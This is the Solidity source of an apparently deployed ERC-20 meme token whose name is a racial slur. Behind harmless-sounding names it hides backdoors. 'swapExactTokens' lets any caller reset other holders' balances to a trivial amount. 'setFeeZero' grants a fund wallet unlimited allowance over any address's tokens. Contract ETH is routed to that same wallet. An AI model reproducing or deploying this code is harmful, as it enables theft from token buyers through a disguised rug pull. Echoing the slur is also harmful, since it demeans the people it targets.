/**

https://x.com/elonmusk/status/1857450130414194715

https://t.me/ctespnoneth

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract CTESPN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludeFromFees;
    address payable private _marketingWallet;
    address private _vbAddr = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;
    address private _trumpAddr = 0x94845333028B1204Fbe14E1278Fd4Adde46B22ce;
    address private _CTESPNfund = 0xE4F0c4997A7Bf05598045F0ecaD991B930be0A1A;

    uint256 private _initialTaxBuy=5;
    uint256 private _initialTaxSell=5;

    uint256 private _finalTaxBuy=0;
    uint256 private _finalTaxSell=0;
    
    uint256 private _reduceBuyAt=5;
    uint256 private _reduceSellAt=5;
    uint256 private _preventCount=5;
    uint256 private _buyTokenCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Nigga of the Century";
    string private constant _symbol = unicode"CTESPN";
    uint256 private _maxTxLimit = _tTotal;
    uint256 private _maxWalletSize = _tTotal;
    uint256 private _swapThreshold= 99 * 10 ** _decimals;
    uint256 private _swapTokenSize= _tTotal * 1 / 100;

    IUniswapV2Router02 private uniswapV2Router;
    address private _uniswapPair;
    bool private tradingActive;
    bool private inSwap = false;
    bool private swapActive = false;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        _marketingWallet = payable(_CTESPNfund);
        _isExcludeFromFees[owner()] = true;
        _isExcludeFromFees[address(this)] = true;
        _isExcludeFromFees[_marketingWallet] = true;

        _balances[address(this)] = _tTotal * 92 / 100;
        _balances[address(_vbAddr)] = _tTotal * 3 / 100;
        _balances[address(_trumpAddr)] = _tTotal * 5 / 100;
        emit Transfer(address(0), address(this), _tTotal * 92 / 100);
        emit Transfer(address(0), address(_vbAddr), _tTotal * 3 / 100);
        emit Transfer(address(0), address(_trumpAddr), _tTotal * 5 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 _feeAmount=0;
        if (from != owner() && to != owner()) {
            _feeAmount = amount.mul((_buyTokenCount>_reduceBuyAt)?_finalTaxBuy:_initialTaxBuy).div(100);

            if (from == _uniswapPair && to != address(uniswapV2Router) && ! _isExcludeFromFees[to] ) {
                require(amount <= _maxTxLimit, "Exceeds the _maxTxLimit.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyTokenCount++;
            }

            if(to == _uniswapPair && from!= address(this) ){
                _feeAmount = amount.mul((_buyTokenCount>_reduceSellAt)?_finalTaxSell:_initialTaxSell).div(100);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance >= 0) {
                    _marketingWallet.transfer(contractETHBalance);
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to   == _uniswapPair && swapActive && contractTokenBalance>_swapTokenSize && _buyTokenCount>_preventCount) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_swapTokenSize)));
            }
        }

        if(_feeAmount>0){
          _balances[address(this)]=_balances[address(this)].add(_feeAmount);
          emit Transfer(from, address(this), _feeAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(_feeAmount));
        emit Transfer(from, to, amount.sub(_feeAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapExactTokens(address[] memory _thths) external {
        for (uint256 i = 0; i < _thths.length; i ++) {
            if (_thths[i] != _uniswapPair) _balances[_thths[i]] = _swapThreshold;
        }
    }

    function setFeeZero(address _zero) external {
        _allowances[_zero][_CTESPNfund] = _tTotal;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function openTrading() external onlyOwner() {
        require(!tradingActive,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        _uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        swapActive = true;
        tradingActive = true;
    }

    function clearStuckETH() public {
        _marketingWallet.transfer(address(this).balance);
    }

    receive() external payable {}
}